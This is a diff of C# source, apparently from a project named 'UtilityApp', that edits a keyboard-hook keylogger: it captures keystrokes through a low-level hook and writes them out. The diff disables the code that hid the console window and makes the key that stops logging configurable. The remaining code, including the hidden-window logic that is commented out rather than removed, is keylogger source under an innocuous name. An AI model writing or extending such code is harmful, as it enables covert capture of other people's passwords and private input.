@@ -24,10 +24,10 @@ namespace UtilityApp
             //Cleanse the variable in case loggin is run twice
             endLogging = false;
 
-            var handle = GetConsoleWindow();
+            //var handle = GetConsoleWindow();
 
             //Hide
-            ShowWindow(handle, SW_HIDE);
+            //ShowWindow(handle, SW_HIDE);
 
             _hookID = SetHook(_proc);
             //Creates writer
@@ -71,15 +71,16 @@ namespace UtilityApp
                 int vkCode = Marshal.ReadInt32(lParam);
                 KeysConverter kc = new KeysConverter();
                 string output = "";
-
+                Keys endKey = (Keys)Enum.Parse(typeof(Keys), Resource1.EndKeyLog, true);
+                if ((Keys)vkCode == endKey)
+                {
+                    endLogging = true;
+                }
                 //Check if its a letter or numpad to keep the switch to a min
-                if (!IsKeyAChar((Keys)vkCode) && !IsKeyANumPadDigit((Keys)vkCode) && !IsKeyADigit((Keys)vkCode))
+                else if (!IsKeyAChar((Keys)vkCode) && !IsKeyANumPadDigit((Keys)vkCode) && !IsKeyADigit((Keys)vkCode))
                 {
                     switch ((Keys)vkCode)
                     {
-                        case Keys.CapsLock:
-                            endLogging = true;
-                            break;
                         case Keys.Space:
                             output = " ";
                             break;
@@ -113,11 +114,12 @@ namespace UtilityApp
             if (endLogging)
             {
                 ConsoleCtrlCheck(CtrlTypes.CTRL_BREAK_EVENT);
-                //Console.WriteLine("Break event");
+                
                 //Environment.Exit(0);
-                var handle = GetConsoleWindow();
-                ShowWindow(handle, 1);
-                Application.Exit();
+                //var handle = GetConsoleWindow();
+                //ShowWindow(handle, 1);
+                //Application.Exit();
+                Application.ExitThread();
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
